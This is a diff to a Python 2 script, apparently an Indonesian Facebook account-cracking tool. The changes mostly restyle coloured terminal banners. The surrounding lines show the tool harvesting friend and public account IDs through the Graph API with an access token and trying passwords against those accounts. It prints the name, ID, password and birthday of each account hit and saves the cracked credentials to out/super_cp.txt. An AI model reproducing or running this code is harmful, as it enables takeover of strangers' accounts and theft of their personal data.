@@ -318,7 +318,7 @@ def pilih_indo():
 	elif teak =="1" or teak =="01":
 		os.system('clear')
 		print logo
-		print "\033[1;31;1m=========================================="
+		print "\033[31;1m︻╦デ╤╾━══════▶KAMVRET◀═════╾━╤デ╦︻"
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -326,8 +326,8 @@ def pilih_indo():
 	elif teak =="2" or teak =="02":
 		os.system('clear')
 		print logo
-		print "\033[31;1m︻╦デ╤╾━══════▶KAMVRET◀═════╾━╤デ╦︻""
-		print "\033[37;1m︻╦デ╤╾━══════▶MILITAN◀═════╾━╤デ╦︻""
+		print "\033[31;1m︻╦デ╤╾━══════▶KAMVRET◀═════╾━╤デ╦︻"
+		print "\033[37;1m︻╦デ╤╾━══════▶MILITAN◀═════╾━╤デ╦︻"
 	        idt = raw_input("\033[36;1m{\033[33;1m✔\033[36;1m} ID publik/teman : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -348,7 +348,7 @@ def pilih_indo():
 		os.system('clear')
 		print logo
 		try:
-			print "\033[1;31;1m=========================================="
+			print "\033[31;1m︻╦デ╤╾━══════▶KAMVRET◀═════╾━╤デ╦︻"
 			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
@@ -399,11 +399,11 @@ def pilih_indo():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in w['error_msg']:
-					print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-					print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
-					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+					print '\x1c\033[36;1m[\033[33;1m✖\033[36;1m] \x1c\033[31;1mCheckpoint'
+					print '\x1c\033[36;1m[\033[33;1m✴\033[36;1m] \x1c\033[33;1mName \x1c\033[33;1m    : \x1c\033[36;1m' + c['name']
+					print '\x1c\033[36;1m[\033[33;1m➹\033[36;1m] \x1c\033[33;1mID \x1c\\033[33;1m      : \x1c\033[36;1m' + user
+					print '\x1c\033[36;1m[\033[33;1m➹\033[36;1m] \x1c\033[33;1mPassword \x1c\\033[33;1m: \x1c\033[36;1m' + pass1 + '\n'
+					print '\x1c\033[36;1m[\033[33;1m➹\033[36;1m] \x1c\033[31;1mTanggal Lahir \x1c\033[33;1m: \x1c\033[31;1m' + c['birthday']
 					cek = open("out/super_cp.txt", "a")
 					cek.write("ID:" +user+ " Pw:" +pass1+"\n") 
 					cek.close()
